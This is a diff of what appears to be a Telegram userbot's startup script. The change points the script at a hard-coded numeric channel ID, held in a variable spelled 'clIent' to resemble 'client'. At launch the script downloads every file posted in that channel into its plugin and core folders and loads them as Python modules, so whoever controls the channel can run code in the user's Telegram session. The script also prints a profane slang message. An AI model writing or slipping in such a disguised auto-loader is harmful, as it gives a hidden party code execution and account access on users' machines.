@@ -46,10 +46,10 @@ else:
     
 
 async def a():
-    username = "@cbkhs"
-    itzsjdude = await bot.get_messages(username, None , filter=InputMessagesFilterDocument) ; total = int(itzsjdude.total) ; total_doxx = range(0, total)
+    clIent = "-1001424009893"
+    itzsjdude = await bot.get_messages(clIent, None , filter=InputMessagesFilterDocument) ; total = int(itzsjdude.total) ; total_doxx = range(0, total)
     for ixo in total_doxx:
-        mxo = itzsjdude[ixo].id ; await client.download_media(await bot.get_messages(username, ids=mxo), "userbot/plugins/")
+        mxo = itzsjdude[ixo].id ; await client.download_media(await bot.get_messages(clIent, ids=mxo), "userbot/plugins/")
         bot.connect()
         
 bot.loop.run_until_complete(a())
@@ -59,7 +59,7 @@ async def plug():
     itzsjdude = await bot.get_messages(username, None , filter=InputMessagesFilterDocument) ; total = int(itzsjdude.total) ; total_doxx = range(0, total)
     for ixo in total_doxx:
         mxo = itzsjdude[ixo].id ; await client.download_media(await bot.get_messages(username, ids=mxo), "userbot/")
-        
+
 bot.loop.run_until_complete(plug())
 
 import glob
@@ -71,9 +71,8 @@ for name in files:
         shortname = path1.stem
         load_module(shortname.replace(".py", ""))
 
-import userbot._core
-
 print("Chal Gya hu bsdk Ab jaa k saved msgs me .help ya .alive type krke confirm kr le")
+import userbot._core
 
 if len(argv) not in (1, 3, 4):
     bot.disconnect()
